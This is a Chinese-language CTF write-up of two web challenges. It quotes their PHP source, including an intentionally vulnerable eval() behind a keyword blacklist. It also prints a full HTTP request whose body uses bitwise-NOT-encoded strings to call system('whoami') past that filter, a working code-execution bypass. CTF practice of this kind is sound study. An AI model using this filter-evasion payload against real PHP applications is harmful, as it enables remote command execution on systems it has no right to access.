+++
title = "shuangyuCTF2024"
slug = "shuangyuctf2024"
description = "垃圾题"
date = "2024-10-06T20:29:53"
lastmod = "2024-10-06T20:29:53"
image = ""
license = ""
categories = ["赛题"]
tags = []
+++

# 0x01 

这次打的不舒服，总感觉奇奇怪怪

# 0x02 question

## web签到

查看源码可得

## shuangyuCTF-web1

```php
<?php

highlight_file('index.php');

// 密码锁PHP代码

// 这是一个超级复杂的密码生成函数（其实并不复杂）
function generate_password($seed) {
    // 初始化一些变量
    $a = 1;
    $b = 1;
    $n = $seed;

    // 斐波那契数列生成，但是有点特别
    for ($i = 0; $i < $n; $i++) {
        $temp = $a + $b + $i; // 注意这里的变种斐波那契
        $a = $b;
        $b = $temp;
    }

    // 将最后的斐波那契数作为密码的一部分
    $password_part1 = $b;

    // 还有一些其他的运算
    $password_part2 = ($seed * $seed + $seed + 1) % 1000; // 这是一个二次函数模运算

    // 密码是这两部分的组合，但是中间有一个固定的分隔符
    $password = $password_part1 . '-' . $password_part2;

    return $password;
}

// 检查用户输入的密码是否正确
if (isset($_POST['password'])) {
    $user_password = $_POST['password'];
    $seed = $_SERVER['REMOTE_ADDR'] % 100; // 使用用户的IP地址作为种子
    $correct_password = generate_password($seed);
    if ($user_password === $correct_password) {
        echo "密码正确，网页解锁！";
        // 这里可以放置flag或者其他奖励内容
        highlight_file('flag.php');
    } else {
        echo "密码错误，请重试。";
    }
}
?>

<!-- 简单的HTML表单 -->
<!DOCTYPE html>
<html>
<head>
    <title>密码锁</title>
</head>
<body>
<form method="post" action="index.php">
    <label for="password">请输入密码:</label>
    <input type="text" id="password" name="password">
    <input type="submit" value="解锁">
</form>
</body>
</html>
```

这道题我被纯纯的折磨了，就直接拿ip就行了，服了，但是我一直搞不到ip

注意是外网的，我局域网里面，wheel没关啥的，一直搞自己

```
curl cip.cc
```

## Gscsed在线版

```php
<?php
highlight_file(__FILE__);
//error_reporting(0);
include('flag.php');
//echo '禁止以任何方式获取webshell，删除系统文件，一经发现，定会溯源，后果自负';

$gt=$_GET['GT'];
$pt=$_POST['PT'];
$ggt=$_GET['GGT'];
$ppt=$_POST['PPT'];

$subgt=substr($flag,0,5);
$len=strlen($flag);
$subpt=substr($flag,$len-1,1);

if($pt==$subpt&&$gt==$subgt){
    echo "进入下一层吧";
}else{
    echo "你输啦";
}


function PTplus($pts)
{
    if (preg_match('/(`|\$|a|s|e|p|require|include|phpinfo|exec|eval|systemctl|shell_exec|system)/i', $pts)) {
        return false;
        
    }else{
        return true;
        
    }
}

function GTplus($gts) {
    if(strpos($gts, '***')){
        return false;
        
    }else{
        return true;
        
    }
}


echo"\n";

if (PTplus($ppt)&&GTplus($ggt)){
    eval($ppt);
    echo "恭喜恭喜";
}else {
    echo "再看看吧";
}
```

第一层没有用，第二层直接异或取反都行(vps搭的环境没回显我靠)

```
POST /1.php?GGT=*** HTTP/1.1
Host: localhost
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: Pycharm-b67cff77=fce87d75-f174-495d-995f-cd4b7f95bc23
sec-purpose: prefetch;prerender
purpose: prefetch
sec-fetch-user: ?1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

PPT=(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);
```

`GGT`直接闭合也可以`}`

# 0x03 小结

抽象，不过更加深刻的认知到ip了
